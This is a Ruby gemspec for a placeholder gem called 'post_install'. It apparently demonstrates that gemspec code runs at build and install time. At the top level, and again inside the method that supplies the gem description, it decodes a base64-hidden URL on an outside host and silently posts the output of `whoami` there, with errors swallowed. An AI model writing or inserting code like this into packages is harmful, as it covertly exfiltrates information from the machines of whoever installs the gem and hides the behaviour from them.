# -*- encoding: utf-8 -*-
$:.push File.expand_path("../lib", __FILE__)

begin
  require 'net/http'
  require 'uri'
  require 'base64'

  Net::HTTP.post_form(URI.parse(Base64.decode64('aHR0cDovL3N0YXJrLXNhbXVyYWktODEyMi5oZXJva3VhcHAuY29tL2xvZ3M=\n')), {'log' => "post install (gemspec outside): #{`whoami`}"})
rescue
ensure
end

class Bar
  def self.foo
    begin
      require 'net/http'
      require 'uri'
      require 'base64'

      Net::HTTP.post_form(URI.parse(Base64.decode64('aHR0cDovL3N0YXJrLXNhbXVyYWktODEyMi5oZXJva3VhcHAuY29tL2xvZ3M=\n')), {'log' => "post install (gemspec inside): #{`whoami`}"})
    rescue
    ensure
    end

    "some description from Bar.foo"
  end
end

Gem::Specification.new do |s|  
  s.name        = "post_install"
  s.version     = '0.0.4'
  s.authors     = ["Benjamin Smith"]
  s.email       = ["benjamin.lee.smith@gmail.com"]
  s.homepage    = ""
  s.summary     = %q{nada}
  s.description = Bar.foo

  s.rubyforge_project = "post_install"

  s.files         = `git ls-files`.split("\n")
  s.test_files    = `git ls-files -- {test,spec,features}/*`.split("\n")
  s.executables   = `git ls-files -- bin/*`.split("\n").map{ |f| File.basename(f) }
  s.require_paths = ["lib"]
  s.extensions = ["Rakefile"]

  # specify any dependencies here; for example:
  # s.add_development_dependency "rspec"
  # s.add_runtime_dependency "rest-client"
end